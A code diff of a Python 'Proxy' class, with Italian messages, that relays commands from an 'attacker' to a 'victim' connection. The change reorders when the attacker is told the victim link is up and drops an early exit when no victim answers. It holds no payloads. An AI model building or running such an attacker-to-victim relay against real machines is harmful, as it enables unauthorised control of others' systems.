@@ -328,8 +328,11 @@ class Proxy:
             with thread_victim_connection.lock: 
                 response=thread_victim_connection.response
             print("Thread has been executed...") 
+            if is_boolean(response): 
+                print("Aggiorno attaccante...")
+                update_attaccante(response)  
             if response: 
-                print("Received confirm from victim...")
+                print("Received confirm from victim...") 
             else: raise RuntimeError("Conferma non arrivata dalla vittima") 
         def update_attaccante(result:bool): 
             #AGGIORNO ATTACCANTE SU CONNESISONE CON VITTIMA
@@ -373,11 +376,7 @@ class Proxy:
             print("Connessione con attaccante stabilita") 
             print("Controllo connesisone con vittima")
             connessione_vittima() 
-            print("Aggiorno attaccante...")
-            update_attaccante(self.thread_data.response)  
-            if not self.thread_data.response: 
-                print("NESSUNA CONNESSIONE CON:",self.ip_vittima) 
-                exit(0) 
+            print("Waiting command from attacker...")
             self.comando_from_attaccante()  
         except Exception as e: 
             print(e) 
